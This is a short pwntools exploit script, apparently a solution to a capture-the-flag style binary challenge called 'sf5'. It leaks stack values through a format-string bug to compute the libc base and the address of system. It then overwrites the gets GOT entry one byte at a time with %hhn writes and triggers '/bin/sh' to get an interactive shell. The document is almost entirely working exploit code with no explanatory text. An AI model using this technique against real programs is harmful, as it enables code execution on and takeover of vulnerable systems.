from pwn import *

p = process("./sf5")

gets_got = 0x601048
# [0x601038] read@GLIBC_2.2.5 -> 0x7fe3384d0350 (read) ◂— cmp 
# p system --> $1 = {<text variable, no debug info>} 0x7fe33841e3a0 <__libc_system>
# 0x7fe3 38 4d0350
# 0x7fe3 38 41e3a0 

p.recvuntil("exit\n")

# buf_start_index --> 6
pay = ""
# pay += "A" * 8 + "B" * 8 + "C" * 8
pay += "%lx-" * 20

p.sendline(pay)

# AAAAAAAABBBBBBBBCCCCCCCC7ffd613e5870-100-7faed7043360-7faed751f700-0-4141414141414141-4242424242424242-4343434343434343-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a-0-

libc_base = int(p.recvline().split(b"-")[2], 16) - 0xf7360
sys = libc_base + 0x453a0

print("libc base = {}".format(hex(libc_base)))
print("sys = {}".format(hex(sys)))

sys_gadget = []
for i in range(8):
    sys_gadget.append((sys >> 8*i)& 0xff)
    
print("sys_gadget = {}".format(sys_gadget))
   
for i in range(6):
    pay = b""
    pay += b"%" + str(sys_gadget[i]).encode() + b"d"
    pay += b"%" + str(14).encode() + b"$hhn"

    pay += b'B' * (8*8 - len(pay))
    
    pay += p64(gets_got + i)
    
    p.sendline(pay)
    
p.sendline("1;/bin/sh")

p.interactive()
